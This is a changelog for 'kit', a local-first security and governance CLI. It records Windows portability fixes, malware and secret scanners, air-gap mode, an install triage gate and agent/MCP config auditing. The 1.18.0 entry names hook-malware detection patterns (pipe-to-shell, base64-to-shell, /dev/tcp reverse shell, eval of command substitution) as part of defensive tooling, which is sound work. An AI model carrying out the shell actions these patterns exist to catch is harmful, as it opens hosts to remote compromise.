- **Windows ACLs for secret files (#43).** POSIX mode bits (`0o600`/`0o700`) are no-ops on NTFS, so kit's secret stores were unprotected on native Windows. New cross-platform `secure-perms` helper: `chmod` on POSIX; on Windows, `icacls /inheritance:r /grant:r <user>:F` (strip inherited ACLs, grant only the current user). Wired into the secret stores: `~/.kit/memory.db` (+ dir), `mcp-tokens.json` (+ dir), `elevation.key`, `totp-secret`. POSIX behavior is byte-identical (63 perm tests still pass on macOS; new helper unit-tested); the Windows branch is exercised by the `windows-latest` probe. Closes the perms half of #43; the remaining Windows test-suite gaps (build ✓, 1526/1542 pass) are mapped on #43.

## [1.29.1] - 2026-06-24

### Fixed

- **Tests run on native Windows (#43).** The `test` script set env via POSIX inline vars (`KIT_NON_INTERACTIVE=1 … node`), which Windows cmd/pwsh can't parse → the suite never started. Replaced with a no-dep `scripts/test.mjs` (sets env in-process, collects `dist/**/*.test.js` itself — no shell-glob — runs `node --test`). Also: `secrets-sync` used a literal `/dev/null` (→ `D:\dev\null` ENOENT on Windows) → now `os.devNull`.
- **Windows probe is diagnosable.** The `windows-latest` workflow now tees the test output to a downloadable artifact (gh's CI logs truncate it), with `pipefail` + `continue-on-error`.

### Notes

- Real `windows-latest` status after this: builds ✓, **1526/1542 unit tests pass** (was: tests couldn't start). The remaining 15 are characterized on #43 — POSIX-path/`startsWith("/")` test assumptions + chmod/`0o600` permission semantics (the latter needs a Windows-ACL decision).

## [1.29.0] - 2026-06-24

### Added

- **`[scan] guarddog = true` — persistent project opt-in for the local malware scan.** GuardDog (#105) was enabled only via the ephemeral `KIT_GUARDDOG=1` env var. `kit check` now also honors a `guarddog = true` flag under `[scan]` in `.kit.toml` (best-effort config read; env var still works and takes precedence in spirit — either enables it). So the choice lives in committed project config, not a per-shell env var. The skip message points at both. (Foundation for an interactive `kit setup` prompt to write the flag — a follow-up.)

## [1.28.2] - 2026-06-24

### Changed

- **Cross-platform build script (#43).** The `build`/`build:prod` scripts used POSIX `rm -rf dist` + `chmod +x dist/cli.js`, which fail on native Windows. Now use two tiny no-dep node scripts — `scripts/clean-dist.mjs` (`fs.rmSync`) + `scripts/chmod-cli.mjs` (no-ops on `win32`) — same output on POSIX (verified: `dist/cli.js` stays `0755`). Lets kit build on Windows; another #43 blocker cleared.

### Added

- **`windows-latest` compatibility probe CI (#43).** A non-required workflow (`workflow_dispatch` + `windows-ci/**` branches) that builds + unit-tests on a real Windows runner and smoke-runs `kit check` (non-blocking) — so the remaining native-Windows blockers (POSIX git hooks, `tar`, secret-file ACLs) get surfaced + fixed against a genuine Windows env instead of guessed at on macOS. Actions are SHA-pinned (passes `kit gha-audit`).

## [1.28.1] - 2026-06-24

### Fixed

- **Tool resolution works on native Windows (#43, incremental).** `resolveToolBin` shelled out to `which`, which doesn't exist on native Windows (PowerShell/cmd). It now uses `where` on `win32` and `which` elsewhere — same first-line path parsing. POSIX behavior is byte-identical (verified); checks off one of #43's hard blockers. (Remaining #43 blockers — POSIX git hooks, `tar` extraction, secret-file ACLs, the build script's `rm`/`chmod`, and a `windows-latest` CI job to verify it all — need a Windows runner and stay open.)

## [1.28.0] - 2026-06-24

### Added

- **GuardDog — local behavioral-malware heuristics for `kit check` (#105, opt-in).** The local-first replacement for the dropped cloud Socket scanner (#103): GuardDog (DataDog, OSS) flags malicious npm/PyPI packages via Semgrep-rules-on-source + metadata heuristics, runs locally, and doesn't upload your manifest. **Opt-in** (`KIT_GUARDDOG=1`) — it needs Semgrep and `verify` fetches/scans each dep, too heavy for the default check; otherwise it surfaces as a `skip` with the enable hint. Resolved mise-first (`pipx:guarddog`). Pure, fixture-tested `classifyGuardDog` is **fail-closed**: a `pass` requires a COMPLETE scan — zero indicators _with rule-errors_ (e.g. missing Semgrep) is a `warn` ("INCOMPLETE/UNVERIFIED"), never a false pass; real indicators always fail. (Triaged before adding: `kit triage pip guarddog` → 100/100.)

### Fixed

- **`scan` and `air_gap` no longer warn as "unknown section" in `.kit.toml`.** Both are valid config sections (added to the zod schema in #65 / #85) but were missing from the `KNOWN_SECTIONS` allowlist, so `[scan.tooling]` (#102) and `[air_gap]` (#85) triggered a spurious "unknown section" warning on every command.

## [1.27.0] - 2026-06-24

### Added

- **No-egress / air-gap support — the offline-enclave stack lands for real (#98, #80).** A 4-deep stacked-PR chain (#83/#84/#85/#93) had squash-merged out of order, leaving it incompletely on main (`[air_gap]` config absent despite "#85 merged"; #84/#93 auto-closed). Reconstructed by rebasing the full stack tip onto current main:
  - **`KIT_AIRGAP=1` offline scan mode (#83)** — runs only offline-capable scanners; no network.
  - **Signed offline threat-data bundle (#84)** — Ed25519 + SHA-256 verified local threat data; fail-closed on a bad signature.
  - **Declarative `[air_gap]` config in `.kit.toml` (#85)** — internal mirror endpoints honored by the triage subprocess even when the env var isn't exported (`process.env` still wins); `air_gap` added to the config schema.
  - **Offline provenance verification — `kit verify-provenance` (#93)** — cosign `--offline` against a shipped-in trusted root; fail-closed.

  Net: link triage at internal mirrors (#73), scan against signed local DBs, verify artifact provenance offline, with a tamper-evident + SIEM-exportable audit trail (1.24.0) — nothing reaches the public internet. Pure helpers fixture-tested (33 airgap+triage tests). The cloud scanners (Socket/Snyk) are deliberately out of this path — neither is air-gappable (#103).

## [1.26.1] - 2026-06-24

### Changed

- **Dropped the Socket scan from `kit check` (#103) — it's cloud-only and can't be local-first or air-gapped.** `checkSocket` ran `socket check`, a command **removed in Socket CLI v1.x** (so it never actually scanned), and Socket's v1.x model (`socket scan create`) uploads your dependency manifest to socket.dev — server-side analysis that breaks kit's zero-network promise and has no offline/self-host path (verified: neither Socket nor Snyk offer an air-gappable analysis engine; their "self-hosted" = your _source_, not their scanner). Socket now surfaces as an informative `skip` ("cloud-only … excluded from kit's local-first check. Local cover: bumblebee + osv-scanner + kit supply-chain") rather than a broken/false-green warn. Removed the now-unused `classifySocketResult`. Run Socket via its own CLI / in CI if you have egress; a local behavioral-malware scanner (GuardDog) is tracked as the local-first replacement.

## [1.26.0] - 2026-06-24

### Changed

- **Secrets scan distinguishes verified-live from unverified — no more critical-failing a clean repo on its own test fixtures.** `kit check`'s trufflehog git-history scan previously failed `critical` on _any_ finding, counting secret-SHAPED strings the same as confirmed leaks — so a repo's own test fixtures / example connection strings / docs blocked the gate. Now only a **verified-live** secret (one trufflehog confirmed still works) is a `critical` fail ("rotate now"); unverified secret-shaped strings are a `warn` to review ("0 verified-live — review for test/example data"). New pure, fixture-tested `classifyTrufflehogFindings`. This is the #1 false-positive class for any security tool whose own suite contains fake secrets.
- **semgrep `.semgrepignore` excludes test fixtures + `.github/` (noise reduction).** Test files carry intentional fake secrets to exercise kit's scanner/redactor (semgrep secret-rule false positives; tests aren't shipped), and workflow YAML is covered by the dedicated `kit gha-audit` (#60) — semgrep only false-positived there on `${{ secrets.* }}` references. Drops kit's own semgrep result from a `fail` (16 fixture/noise findings) to a `warn` (genuine low-severity items only).

## [1.25.1] - 2026-06-24

### Fixed

- **`kit check` Socket scan no longer fails open — a not-logged-in Socket can't masquerade as "passed".** `checkSocket` previously treated any non-JSON `socket check` output as "passed" (`catch { /* passed */ }` + a bare exit-0 → `pass`), so an installed-but-unauthenticated Socket — which appears to run while checking nothing — could report a green "no supply chain issues detected" and give false assurance. Now a `pass` requires POSITIVE proof the scan ran (valid result JSON); not-logged-in / unparseable output / non-zero exit all surface loudly as **"socket NOT scanning — supply chain UNVERIFIED"** with a `socket login` hint, never as pass. Decision logic extracted to a pure, fixture-tested `classifySocketResult`. (Same fail-closed principle as #74 for `kit scan`; `checkSemgrep` was already fail-closed.)

## [1.25.0] - 2026-06-24

### Added

- **Opt-in redaction-at-capture — `KIT_MEMORY_REDACT=1` (#91).** The memory store is raw by default (a key in any transcript is persisted to `memory.db` in cleartext — a stolen-laptop / backup-spillage risk). With `KIT_MEMORY_REDACT=1`, secret-shaped substrings in a message's `content` and a tool's `tool_input` are masked (via the same `redactSecrets` patterns) **before** they are written, so the secret never lands in the DB. Off by default → no behavior change; FTS still works over the redacted text for non-secret terms.

### Removed

- **Dead `Redacted<T>` wrapper (#92).** The `src/utils/redacted.ts` wrapper (added in 1.15.0) had no importers; removed it and its test. (Secret masking is done by `redactSecrets`, which stays.)

## [1.24.0] - 2026-06-24

Consolidated security-hardening batch (merged PRs #70–#94) + two recovered features.

### Security

- **Triage install-gate forgery [CRITICAL] (#70).** A forgeable PASS verdict could defeat the `kit triage` install gate; verdicts are now unforgeable.
- **Shell command injection in `kit pkg` (#71).** Eliminated an injection vector in package handling.
- **Secret values leaked in sync error messages [HIGH] (#72).** `kit secrets sync` now redacts secret values from `gh`/API error output.
- **Broader secret redaction (#82).** Catches URL-embedded credentials and `sk-svcacct`/admin-style keys.
- **Elevation scope split for irreversible JWT cutover [MEDIUM] (#78).** Irreversible ops get a separate elevation scope.
- **Bumblebee prescan fails closed (#79).** An incomplete scan is surfaced as such instead of failing open.
- **Hardened memory backup (#76).** 0600 restore perms + versioned scrypt KDF.
- **Fail-closed audit for destructive ops (#88).**

### Added

- **Tamper-evident audit log — `kit audit verify` (#86).** Hash-chained audit log.
- **SIEM export — `kit audit export` (CEF / syslog / json) (#90, recovered).**
- **agent-audit coverage expansion.** stdio MCP servers that run inline/obfuscated code (#75); OpenCode + Codex agents (#87); Claude command/agent/skill/plugin + settings exec surfaces (#94, recovered).
- **Configurable registry endpoints for air-gapped / mirror use (#73).** `KIT_AIRGAP` offline mode (#83).

### Fixed

- **`kit scan` surfaces unparseable scanner output as an error (#74)** instead of reporting "ran clean".

### Changed

- **Dead-code removal + hardened tar extraction (#89).**

> Note: the broader air-gap feature set (declarative `[air_gap]` config #85, signed threat-data bundle #84, offline provenance verification #93) landed **incompletely** from a stacked-PR squash-merge and is **not** included here — see the open follow-up.

## [1.23.0] - 2026-06-24

### Added

- **`kit memory stats` becomes a real instrument — recall count + token economy.** Beyond sessions/messages/tool-uses, `kit memory stats` now reports: **tokens** (input/output totals from the indexed transcripts — already captured per message; `--tokens` adds tokens/message, tokens/session, a by-model breakdown, and a **cache-hit ratio**), **recalls** (how often the store is actually searched — net-new `query_log` records each `kit memory search` with its hit count; surfaces total/last-7d/distinct/top-terms), a **logical-vs-sidechain session split** + transcript-files-indexed (exposes the "N files → M logical sessions" collapse), and `--heatmap` (a per-day activity sparkline over the last 90 days). All local-first, zero-LLM, sourced from the same SQLite DB + transcripts kit already owns. Pure `summarizeTokens`/`sparkline` fixture-tested; schema migrated to v4 (cache-token columns on `messages`, new `query_log`). Cache-hit ratio is `n/a` until cache data accumulates (forward-only; older rows predate the columns).

### Fixed

- **`kit memory search` no longer leaks a space-form flag value into the query.** `--limit 3` / `--project /p` (space form) previously kept the value token (`3`) as a search term, polluting both the FTS query and (now) the recall log; the value is now consumed. The `--flag=value` form was unaffected.

## [1.22.0] - 2026-06-23

### Added

- **Sentinel layer 3 — scheduling + surfacing (#53).** L2 produces proposals on demand; L3 makes them _recur_ and _visible_, staying zero-LLM + agent-agnostic. `kit sentinel install` scaffolds a GitHub Actions scheduler (`.github/workflows/kit-sentinel.yml`, weekly by default, `--schedule "<cron>"`, refuses to clobber without `--force`) that recurs `kit sentinel run --json` — an agent (or a downstream job step) acts on the JSON. `kit sentinel run` now caches a compact summary to `.kit/sentinel.json` (best-effort; never fails the run), and `kit sentinel status` prints a one-line SessionStart surface (`[sentinel · N fresh, M need you]`) — silent when nothing is fresh, `--json` for the raw digest. Pure `proposalSummary` / `sentinelStatusLine` / `sentinelWorkflow` fixture-tested.

### Changed

- **`kit scan` resolves scanner tokens from a tooling vault — no `infisical run` wrapper (#65).** New optional `[scan.tooling]` config (`project_id`, `env`) points at a shared Infisical project (e.g. `sandstream-common`); `kit scan` resolves each scanner's `needsToken` (e.g. `SNYK_TOKEN`) from there and injects it into the scanner subprocess env. The value flows vault→subprocess and is never logged. New uncached `fetchInfisicalProjectSecrets` (distinct from the cached per-app `fetchInfisicalSecrets`); a token already in `process.env` always wins.

## [1.21.0] - 2026-06-23

### Added

- **Baseline suppression for `kit scan` (#59).** Reuses kit's `.kit-baseline.json` (new `scan` category): `kit scan` suppresses findings whose key is baselined; `kit scan --update-baseline` freezes the current set. Noise reduction is the #1 adoption blocker — accept a finding once (e.g. a false positive) and it stays quiet. Pure `suppressBaselined` fixture-tested.
- **GitHub Actions hardening lint — `kit gha-audit` (#60).** Static, local-first, no-YAML-dep scan of `.github/workflows`: unpinned action refs (tag/branch instead of a full commit SHA — the tj-actions/changed-files CVE-2025-30066 class) and "pwn request" (`pull_request_target` + `actions/checkout`). Findings carry CWE-1357 / OWASP-A08 citations.
- **SBOM + SARIF emit — `kit sbom`, `kit scan --sarif` (#61).** The emit side of the #48 ingest adapter: `kit sbom --format cyclonedx|spdx` generates an SBOM from `package-lock.json` (with purls; EU-CRA-ready), and `kit scan --sarif` emits the merged scan verdict as SARIF 2.1.0 (kit as the tool, citations on rules). Pure emitters fixture-tested.
- **`kit doctor` detects mise tools not on PATH (#64).** Warns when mise's shims dir exists but isn't on `PATH` (bare `snyk`/`trivy`/`infisical` won't resolve) and prints the exact fix line. New `mise-path.ts` pure helpers + idempotent `ensureMiseActivation`; prefers shims-dir-on-PATH over the fragile `mise activate`.

## [1.20.0] - 2026-06-23

### Added

- **Scanner-runner registry (`kit scan`) — runs external scanners and merges them into one local verdict.** kit's consolidation play: a data-driven registry (Snyk, Trivy, Grype, Semgrep, OSV-scanner) runs each applicable+installed scanner (resolved mise-first; cleanly skipped when not installed / its token is missing / not applicable), pipes the SARIF/OSV output through the #48 ingest adapter, and **merges + dedups** the results — the same CVE/GHSA reported by multiple scanners collapses to one row with max severity and the union of which scanners flagged it. Local-first, zero-server, deterministic. Pure registry/merge/dedup fixture-tested; orchestration is dependency-injected. Complements `kit check`'s native scanners (socket/semgrep/trivy/osv/trufflehog/bumblebee). (#62)

## [1.19.0] - 2026-06-23

### Added

- **Sentinel layer 2 — the agent-agnostic responder (`kit sentinel run`).** kit **proposes**, any agent **disposes**, any scheduler **triggers**. `kit sentinel run --json` turns red layer-1 findings into a stable, typed remediation-proposal document — kit never calls an LLM and never opens a PR/issue; whichever agent (Claude Code, Codex, Cursor, …) reads the JSON and performs the writes with its own model + creds (the JSON contract is the agnostic seam). Triage→artifact: **code**→draft-PR, **human/infra**→issue, **noise**→suppression-PR (never a silent mute). Each artifact carries a `<!-- kit-sentinel:<id> -->` marker; kit dedups read-only against open issues/PRs via `gh` (agent stays write-only), and `.kit/sentinel-suppress.toml` (`suppress = [...]`) filters findings. Pure proposal engine fixture-tested; the `buildHealthCtx` sensor-selection builder is now shared by `kit health` + sentinel. Design: `docs/specs/2026-06-23-sentinel-layer2-responder.md`. (#52)

## [1.18.0] - 2026-06-23

### Added

- **Agent / MCP / hook auditing (`kit agent-audit`).** A kit-native baseline over the coding-agent supply-chain surface: scans agent/MCP configs (`.claude.json`, `.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json`, `.claude/settings*.json`) for **plaintext secrets** (reuses `findSecrets` — the `.claude.json` `sk_live` leak class) and **cleartext `http://` MCP servers**, and git hooks (`.git/hooks`, `.githooks`, `.husky`) for **malware-shaped lines** (pipe-to-shell, base64-decode-to-shell, `/dev/tcp` reverse shell, `eval` of a command substitution). Pure analyzers fixture-tested; read-only, fail-open per file. (#47)

## [1.17.0] - 2026-06-23

### Added

- **Install-time supply-chain triage (`kit supply-chain`).** Four deterministic, local-first checks over `package.json` + `package-lock.json` (no network, no node_modules walk): **install-scripts** (deps that run pre/post/install — the malware-execution vector, from the lockfile's `hasInstallScript`), **lockfile-drift** (declared deps missing from the lockfile + packages resolved from a non-registry http/git source), **dep-confusion** (a dep under a declared `[supply_chain] internal_scopes` entry that the lockfile resolves from the PUBLIC registry), and **slopsquat** (a dep name ≤1 Damerau-Levenshtein edit — incl. transposition, e.g. `lodahs`→`lodash` — from a bundled high-traffic-package corpus). Pure check functions are fixture-tested; the typosquat corpus is local and curated. (#49)

## [1.16.0] - 2026-06-23

### Added

- **SARIF + OSV ingestion adapter — one parser per format, not per tool (`kit ingest <sarif|osv> <file>`).** SARIF 2.1.0 (semgrep/CodeQL/Trivy/Grype/…) and OSV-scanner JSON normalize into kit's `SecurityCheckResult` shape: SARIF maps `security-severity` (CVSS) → severity with a `level` fallback and lifts `CWE-NNN` rule tags into a citation; OSV maps package vulnerabilities to `dependency` findings with an OWASP-A06 citation. Pure (string → findings), fixture-tested; `kit ingest` prints them severity-sorted (`--json` for the raw list). Ingesting the _format_ means any SARIF/OSV-emitting scanner feeds kit's finding ledger uniformly. (#48)

## [1.15.0] - 2026-06-23

### Added

- **`kit health` completes connected-service sensor coverage: Supabase advisor + TLS-cert.** The Supabase sensor probes the Management API security advisors (`GET /v1/projects/:ref/advisors/security` with `SUPABASE_ACCESS_TOKEN` + `SUPABASE_PROJECT_REF`) and goes red (class `code`) on ERROR-level lints (RLS-disabled / exposed-data); selected when `supabase` is a detected service. The TLS-cert sensor checks certificate expiry for the host(s) in `KIT_TLS_HOST` (warn window `KIT_TLS_WARN_DAYS`, default 21) over a native TLS handshake — red (critical) when already expired, red (high) within the window, green otherwise. Both report `unknown`, never a false `green`. Pure parsers/evaluators are unit-tested; live API/handshake smoke is pending real creds. (#51)
- **Context-lock now covers app-service auth identity: Keycloak realm, Auth0 tenant, Clerk environment.** `[context.keycloak] realm`, `[context.auth0] tenant`, and `[context.clerk] env` join the lock table; `kit context check` reads the live value from the app's env (`KEYCLOAK_REALM`, `AUTH0_DOMAIN`/`AUTH0_TENANT`, and the `pk_live_`/`pk_test_` prefix of `CLERK_PUBLISHABLE_KEY`) and verifies it matches the declared one — a "dev pointed at prod" guard (a prod Clerk key in a dev checkout is a mismatch, not a silent pass). One data row each; the lock stays data-driven. (#38)
- **`Redacted<T>` secret wrapper (`src/utils/redacted.ts`).** A value held in a module-private WeakMap that masks as `<redacted>` through `String()`, `JSON.stringify`, `util.inspect`/`console.log`, and object-key enumeration; the only path to the value is the explicit `.expose()`, so secret reads stay grep-able. Borrowed from Effect's `Redacted` pattern (the pattern, not the framework). (#46)

## [1.14.1] - 2026-06-22

### Fixed

- **`kit check` no longer exits non-zero on Linux hosts without a detected LUKS device.** The disk-encryption check returned a low-severity `warn` whenever `lsblk` found no `crypt` device, and a warn counts as an issue — so `kit check` exited `1` on any non-CI Linux machine without confirmable full-disk encryption (only masked in GitHub Actions by the `CI=true` skip). Absence of a crypt device is not proof FDE is off (encrypted host VMs, LVM layouts), and Linux has no authoritative "off" signal like macOS `fdesetup` / Windows `manage-bde`. The Linux indeterminate branch now follows the module's documented fail-open contract and `skip`s, matching the macOS/Windows indeterminate paths. Authoritative "OFF" detection on macOS/Windows still warns at high severity.

### Added

- **Platform-support documentation.** A new `docs/PLATFORM_SUPPORT.md` and a README section spell out the support matrix: macOS and Linux are supported natively; Windows is supported via WSL2, Git Bash, or the signed Docker image. Native Windows (PowerShell/cmd) is not supported yet — the concrete blockers (POSIX-shell git hooks, `which`/`tar` assumptions, NTFS mode-bit no-ops, POSIX build script) are documented and tracked.

## [1.14.0] - 2026-06-22

### Added

- **`kit health` adds Sentry + Resend sensors (runtime errors + email-delivery).** Sentry probes the issues API (`GET /api/0/projects/:org/:project/issues/?query=is:unresolved firstSeen:-24h`) with `SENTRY_AUTH_TOKEN` (`SENTRY_URL` overrides the region) and goes red on new unresolved issues in the last 24h. Resend probes `GET /domains` with `RESEND_API_KEY` and goes red (class `human` — a DNS/customer action, not a code fix) when any sending domain is not `verified`. Both report `unknown` (never a false `green`) on missing creds or a non-OK response. These two are **selected by connected-service detection** (the registry sees `@sentry/*` / `resend` in deps), per the sentinel design's "derive from connected services". Live API smoke pending real tokens; parsers fixture-tested.
- **`kit health` adds a Vercel sensor (failed production deploys).** Probes the Vercel REST API (`GET /v6/deployments?target=production`) with `VERCEL_TOKEN`, using the `projectId`/`teamId` from `.vercel/project.json`; flags the most recent _terminal_ production deployment as red when its state is `ERROR` (`CANCELED` is not red), and reports `unknown` (never a false `green`) when the project isn't linked, the token is missing, or the API errors. Reuses the `httpGet` probe path the GitLab/Bitbucket sensors introduced. Live API smoke is pending a real token; the parsers are fixture-tested.

### Fixed

- **`kit check` (tools) and `kit doctor` now detect tools installed globally via `mise use -g`.** Both decided tool presence/version with `mise current <tool>` (project-scoped) plus a bare `<tool> --version` / `which <tool>` on PATH — so a tool installed globally with `mise use -g` reported as _not installed_ whenever mise wasn't activated in the shell (its shims aren't on PATH then, and kit's own process doesn't activate it). This made e.g. globally-installed `semgrep`/`trivy` invisible in `kit check`'s Tools section even though the security scan ran them (the scanners already resolved mise-first via `resolveToolBin`). Both now resolve the binary through `resolveToolBin` (`mise which` → PATH) before reading its version, closing the gap. `checkTools` takes the resolver as an injectable parameter (default `resolveToolBin`) so the global-mise path is unit-tested.
- **Service auth checks/logins and the `pip-audit` / `license-checker` scans now resolve mise-first too.** `kit check` (service auth) and `kit login` exec a service's `check`/`login` CLI (`stripe`, `vercel`, `supabase`, …) by bare command name, and the `pip-audit` + `license-checker` dependency scans did the same — so a `mise use -g` install was unreachable when mise wasn't activated. All now resolve via `resolveToolBin` before exec, with a bare-name fallback (`npm` stays bare — it ships with node and is always on PATH; `license-checker` still falls back to `npx`). Completes the mise-first coverage the security scanners (semgrep/trivy/socket/osv/trufflehog) already had.

## [1.13.0] - 2026-06-22

### Added

- **Context-lock now covers your SSH identity per project.** A new `[context.ssh]` block locks which key a repo pushes/deploys with — declare any of `identity` (the IdentityFile path), `fingerprint` (`SHA256:…`, machine-portable), or `host_alias` (the `~/.ssh/config` Host the remote uses). `kit context check` reads the repo's _effective_ identity — a per-repo `core.sshCommand` `-i` override wins, otherwise it resolves the remote host through `ssh -G` — derives the key fingerprint via `ssh-keygen -lf`, and verifies it matches. Pushing a repo with the wrong account's key is a mismatch, not a silent pass — the SSH analog of the git-host remote lock. Pure parsers (`core.sshCommand` `-i`, `ssh -G` identityfile, keygen fingerprint, remote host) are unit-tested; the live `ssh -G` read smoke-tests on a real machine.
- **`kit health` now covers all three git hosts: GitLab CI and Bitbucket Pipelines sensors (GitHub was already there).** Both probe the platform REST API via a new `httpGet` on `HealthDeps` (the HTTP-probe path the sentinel design anticipated): GitLab `GET /api/v4/projects/:path/pipelines` with `GITLAB_TOKEN`, Bitbucket `GET /2.0/repositories/:ws/:repo/pipelines/` with `BITBUCKET_TOKEN` (or `BITBUCKET_USERNAME` + `BITBUCKET_APP_PASSWORD`). Each flags the most recent terminal pipeline as red when it failed, records the `host/path` it checked, and reports `unknown` (never a false `green`) on a missing token, a non-OK response, or no git remote. Sensors are selected by CI-file presence (`.gitlab-ci.yml` / `bitbucket-pipelines.yml`). Also: `analyze`'s CI-file detection now recognizes `bitbucket-pipelines.yml` (it knew `.github/workflows` + `.gitlab-ci.yml` but missed Bitbucket). Live API smoke is pending a real GitLab/Bitbucket project + tokens; the parsers + auth + remote-parsing are fixture-tested against the documented schemas.
- **Context-lock now covers GitLab and Bitbucket, not just GitHub.** `[context.gitlab]` (`group`, `remote`) and `[context.bitbucket]` (`workspace`, `remote`) join `[context.github]`: `kit context check` parses the live `origin` remote per host and verifies it matches the declared values, so a repo pushed to the wrong GitLab group or Bitbucket workspace is a mismatch, not a silent pass (same cross-account guard as GitHub). The brownfield `kit init` offer (`suggestContextToml` / `hasLockableContext`) now also surfaces a detected GitLab/Bitbucket binding. One `(tool, field)` row each — the lock table stays data-driven.
- **Two services in the registry: Keycloak and Atlassian (acli).** Keycloak is detected from its clients (`keycloak-js`, `keycloak-connect`, `keycloak-admin-client`, `keycloak-angular`, `python-keycloak`, Go `gocloak`) and declares its realm/admin secrets (`KEYCLOAK_URL`, `KEYCLOAK_REALM`, `KEYCLOAK_CLIENT_ID/SECRET`, `KEYCLOAK_ADMIN/_PASSWORD`); it carries no mise tool because it is a self-hosted server (run via Docker), with admin through the server's own `kcadm.sh`. Atlassian is detected from `bitbucket-pipelines.yml` / `.bitbucket`, provisions the Atlassian CLI via mise (`tool: acli` → `aqua:atlassian.com/acli`), and tracks `ATLASSIAN_API_TOKEN` / `ATLASSIAN_SITE_URL`; its auth is left as an informational note rather than a guessed login command. Adding each was a single registry data row (no detector/generator edits), per the unified-registry design.
- **`kit check` verifies full-disk encryption and flags an exposed memory store.** A new check confirms the disk is encrypted (FileVault on macOS, BitLocker on Windows, LUKS/`crypt` on Linux) and warns when kit's memory database sits inside the repo tree (where it could be committed) rather than the home-dir store. Read-only and best-effort: an undeterminable state is reported, never assumed encrypted.
- **`secrets validate` and `env diff` are now wired into the CLI.** Both were documented but unrouted; `secrets validate` checks declared secret sources resolve, and `env diff` compares the declared vs present environment.

### Fixed

- **Flaky local test runs (intermittent file-level failures + drifting test counts) traced to a dirty `dist/`.** The `build` script (unlike `build:prod`) never cleaned `dist/`, so compiled output from deleted/renamed sources accumulated, and editor/sync conflict copies (` 2.ts`, ` 3.ts`, …) left stale `dist/* [0-9].js` files. The `test` glob (`dist/*.test.js`) then ran those orphans as duplicate/divergent tests, producing nondeterministic counts (e.g. 2355 → 2359 → 2361) and sporadic "not ok" with zero failing subtests. Fix: `build` now `rm -rf dist` before compiling (matching `build:prod`), so every run tests only current sources, and the tsconfig conflict-copy exclude was widened from `* 2.ts` to `* [0-9].ts`/`.tsx` to cover all numbered copies. Verified: 16 consecutive clean runs held a stable 2355 tests / 0 failures.
- **`.gitignore` hardening no longer hides the curated shared-memory tier.** `check-gitignore` now ignores `.kit/*` (contents) but re-includes `!.kit/shared/`, so kit's local state stays ignored while the committed-by-design `.kit/shared/` (e.g. shared memory) remains tracked. The old wholesale `.kit/` rule made git refuse to descend into the dir, so a later negation could not re-include it.

### Removed

- **Flushed ~30k lines of dead, unreferenced code** — the app-ops + SaaS-scaffold cluster and the marketplace/monetization cluster. `tsc` confirmed nothing remaining imported them (the build stays green), so this is pure dead-weight removal, not a behavior change. Trims kit toward its focused CLI/governance core.

## [1.12.0] - 2026-06-21

### Added

- **`kit health` — deterministic external-system health probe (kit sentinel, layer 1).** A new read-only command that probes the project's connected external systems and surfaces failing ones, mirroring red findings into the PAL ledger under a new `health` source tag so they appear cross-session and auto-close when the system goes green again. Account-verified: it records which org/repo it checked and reports `unknown` rather than a false `green` when it cannot confirm the account or a probe errors. First sensor is GitHub Actions — flags workflows whose latest completed run failed, excluding disabled workflows (so a stale failure from a dead workflow is not reported). `--json` for machine output; the command is wrapped in the governance read path. Sensors are derived from the project's connected services; more (Vercel, Sentry, Supabase, Resend, TLS cert) land incrementally. Design and plan are in `docs/specs/2026-06-21-kit-sentinel-design.md` and `docs/plans/2026-06-21-kit-health-v1a.md`.

## [1.11.1] - 2026-06-20

### Fixed

- **Semgrep blocked the 1.11.0 push on a reviewed false positive in the triage skill.** `skills/triage/scripts/triage.py` triggered `python.lang.security.audit.dynamic-urllib-use-detected` (SSRF audit) on its `urlopen` call. The finding does not apply here: a registry-triage tool must fetch the target's page, the host is a hardcoded allowlisted registry (registry.npmjs.org / pypi.org / api.github.com / hub.docker.com), and only the package/repo name is interpolated into the path (url-quoted for npm/pip, parsed to owner/repo for GitHub), so an attacker cannot redirect the host. Suppressed with an inline `# nosemgrep` plus a justification comment.

## [1.11.0] - 2026-06-20

### Added

- **kit ships and self-installs its own triage skill, so the gate works out of the box.** The watertight install gate (1.10.0) shells to `~/.claude/skills/triage/scripts/triage.py`, but kit never provided that skill: on a fresh machine the script was absent, so the gate (and `kit triage`) fell back to fail-closed and blocked every install. kit now bundles a deterministic, zero-LLM, stdlib-only triage skill (`skills/triage/`, shipped via the package `files` list) and self-bootstraps it. The first time the gate or `kit triage` runs and the script is missing, kit copies its own bundled, provenance-published copy into `~/.claude/skills/triage/` (copying kit's own shipped asset is not a third-party install, so it needs no triage). The script does real per-type checks: npm (existence, deprecation, age, maintainer count), pip (yanked, age, license), repo (archived/disabled, maintenance, license, honoring `GITHUB_TOKEN` for rate limits), docker (freshness, publisher), and skill (local `SKILL.md` frontmatter plus a secret scan). It prints `Health score: N/100`, `Critical issues: N`, `Warnings: N`, and `TRIAGE PASSED` only when there are zero critical issues. Warnings are scored but do not, by themselves, withhold a pass. Fail-closed: an unreachable registry (offline, timeout, HTTP error) is a critical ("cannot verify"), so the pass is withheld and kit blocks the install.

## [1.10.0] - 2026-06-20

### Added

- **The triage gate: kit installs nothing untriaged — including itself.** Every install kit performs now passes through one watertight, fail-closed gate (`src/triage-gate.ts`). A third-party tool (a mise ref carrying a scheme — `aqua:owner/repo`, `npm:pkg`, `pipx:pkg`) is mapped to a `kit triage` target and installed **only on an explicit `TRIAGE PASSED`**. A core language runtime (a bare mise name like `node`/`pnpm`, installed by mise with checksum verification) is the trusted base and passes without a reputation triage. Everything else **blocks**: a triage WARN, a FAIL, triage offline, the triage script missing, or a ref kit cannot map — "cannot verify" is treated as "do not install", never "probably fine". This closes a real hole: `kit heal` previously auto-installed a missing scanner (e.g. trivy) via `mise install` with no triage at all. Wired into `installTools`, so `kit install` / `kit fix` / `kit heal` are all governed; `kit heal` demotes a tool it cannot install through the gate to a GATED proposal (never bypasses). The single bypass is `kit install --no-triage`, which must hold a one-shot elevation (`kit auth elevate --scope tools.install.no-triage`) and is audit-logged.
- **`kit upgrade --self` — governed self-update.** kit triages the `sandstream-kit` npm package before installing a new version of itself, and installs **only on a triage PASS** (offline / triage-unavailable → refused). The stale-version notices now point here instead of raw `npm i -g`.
- **Opt-in `[update] auto`.** When set, a newer kit found during `kit check` triggers the governed self-upgrade automatically — same gate, still fail-closed (never installs on triage fail). Off by default (auto-installing stays a deliberate trust decision). This refines the 1.9.0 stance ("auto-update deliberately NOT added"): auto-update now exists, but only through triage.
